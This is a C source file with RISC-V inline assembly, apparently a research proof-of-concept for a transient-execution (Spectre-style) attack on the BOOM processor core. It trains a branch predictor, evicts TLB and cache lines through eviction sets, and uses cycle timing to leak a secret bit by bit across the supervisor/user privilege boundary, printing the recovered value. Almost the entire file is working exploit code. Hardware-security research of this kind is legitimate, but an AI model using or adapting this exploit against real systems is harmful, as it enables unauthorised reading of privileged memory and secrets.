/* We base our exploit on the PoC provided by SpecDoctor. However, since we leak from S- 
tom U-mode, we cannot flush the TLB. Instead, we need to evic it using eviction sets.
 */

#include <stdio.h>
#include <stdint.h>
#include "util.h"
#include "encoding.h"

extern uint8_t data0[];
extern uint8_t data1[];
extern uint8_t data2[];
extern uint8_t secret[];
# define user_l2pt pt[1]

#define S_WORD 32
#define N_TRAIN 16

void transient(uint64_t idx, uint8_t *addr) {
    // Flush all PTEs (for deterministic)
    #ifdef USE_SFENCE
    asm volatile("sfence.vma zero, zero"); 
    #else 

    // Flush all PTEs
    asm volatile("la a4, data3\n"
                "li t3, 1\n"
                "slli t3, t3, 12\n"
                "ld zero, 0(a4)\n"
                "fence\n"
                "add a4, a4, t3\n"
                "ld zero, 0(a4)\n"
                "fence\n"
                "add a4, a4, t3\n"
                "ld zero, 0(a4)\n"
                "fence\n"
                "add a4, a4, t3\n"
                "ld zero, 0(a4)\n"
                "fence\n"
                "add a4, a4, t3\n"
                "ld zero, 0(a4)\n"
                "fence\n"
                "add a4, a4, t3\n"
                "ld zero, 0(a4)\n"
                "fence\n"
                "add a4, a4, t3\n"
                "ld zero, 0(a4)\n"
                "fence\n"
                "add a4, a4, t3\n"
                "ld zero, 0(a4)\n"
                "fence\n"
    );
    asm volatile("fence\n");
    #endif


    // Flush all cache line conflicting with target line
    asm volatile("la a4, conflict0 + 64\n"
                 "ld a2, 0(a4)\n"
                 "la a4, conflict1 + 64\n"
                 "ld a2, 0(a4)\n"
                 "la a4, conflict2 + 64\n"
                 "ld a2, 0(a4)\n"
                 "la a4, conflict3 + 64\n"
                 "ld a2, 0(a4)\n"
                 "la a4, conflict4 + 64\n"
                 "ld a2, 0(a4)\n"
                 "la a4, conflict5 + 64\n"
                 "ld a2, 0(a4)\n"
                 "la a4, conflict6 + 64\n"
                 "ld a2, 0(a4)\n"
                 "la a4, conflict7 + 64\n"
                 "ld a2, 0(a4)\n");

    asm volatile("fence\n");

    // Fetch PTE and cache line only for the secret address
    asm volatile("la gp, 1f\n"
                 "la a5, data0\n"
                 "la a4, data2\n"
                //  "la a4, secret\n"
                 "li a2, 256\n"
                 "li a3, 2\n"
                 "fcvt.s.lu fa4, a3\n"
                 "fcvt.s.lu fa5, a2\n"
                 "fdiv.s    fa5, fa5, fa4\n"
                 "fdiv.s    fa5, fa5, fa4\n"
                 "fcvt.lu.s a2, fa5\n"
                 "add a4, a4, a2\n"
                 "ld a4, 0(a4)\n"
                 "beqz a4, RET \n"
                 "ld a3, 0(a1)\n"
                 "srl a3, a3, a0\n"
                 "andi a3, a3, 1\n"
                 "slli a3, a3, 12\n"
                 "add a5, a5, a3\n"
                 "ld a5, 0(a5)\n"
                 "RET: \n"
                 "1: li gp, 0\n");

    return;
}



int main(void) {
    uint64_t sec = 0xdeadbeef;
    uint8_t test = 0;
    uint8_t bits[S_WORD] = {0,};
    uint8_t votes[S_WORD] = {0,};

    uint64_t start, end, dummy;
    #ifndef HIDE_PRINT
    printf("[*] New transient execution attack on BOOM\n");
    #endif


    *((uint64_t *) (data2+0x40)) = -1;
    asm volatile("fence\n");
    // warmup
    for(int t=0; t < N_TRAIN; t++){
        transient(0,data2);
    }
    
    *((uint64_t *) (data2+0x40)) = 0;
    asm volatile("fence\n");
    
    uint64_t measure_start, measure_end;
    asm volatile("csrr %0, cycle\n"
        : "=r"(measure_start));

    for (int idx = S_WORD - 1; idx >= 0; idx--) {
        #ifndef HIDE_PRINT
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
        #endif

        uint64_t cycles[TRIAL] = {0, };

        // After the training routine, we can rely on 3 mispredictions
        // We therefore only need to train once for each set of 3 trials
        *((uint64_t *) (data2+0x40)) = -1;
        asm volatile("fence\n");

        for(int t=0; t < N_TRAIN; t++){
            transient(idx,data2);
        }
        
        *((uint64_t *) (data2+0x40)) = 0;
        asm volatile("fence\n");

        for (int t = 0; t < TRIAL; t++) {

            transient(idx,secret);

            asm volatile("csrr %0, cycle\n"
                         : "=r"(start));
            dummy = data0[64];
            asm volatile("csrr %0, cycle\n"
                         : "=r"(end));

            cycles[t] = end - start;
            #ifndef HIDE_PRINT
            printf("%ld ", cycles[t]);
            #endif

        }

        int sum = 0;
        for (int t = 0; t < TRIAL; t++) {
            if (cycles[t] > 65)
                sum++;
        }

        // We prioritize sum since BIM entry should not be updated at all when secret is 0
        bits[idx] = (sum > TRIAL/2)? 1:0;
        votes[idx] = (sum > TRIAL/2)? sum:TRIAL - sum;
        #ifndef HIDE_PRINT
        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
        #endif
    }


    #ifdef MEASURE_PERF
    asm volatile("csrr %0, cycle\n"
        : "=r"(measure_end));
    printf("Leaked %d bytes in %d cycles\n", S_WORD, measure_end-measure_start);
    #endif

    #ifndef HIDE_PRINT
   printf("[*] Secret: 0x");
   for (int idx = S_WORD - 4; idx >= 0; idx-=4) {
       uint16_t hex = bits[idx+3] << 3 | bits[idx+2] << 2 | bits[idx+1] << 1 | bits[idx];
       printf("%x", hex);
   }
   printf("\n");
   #endif
    return 0;
}
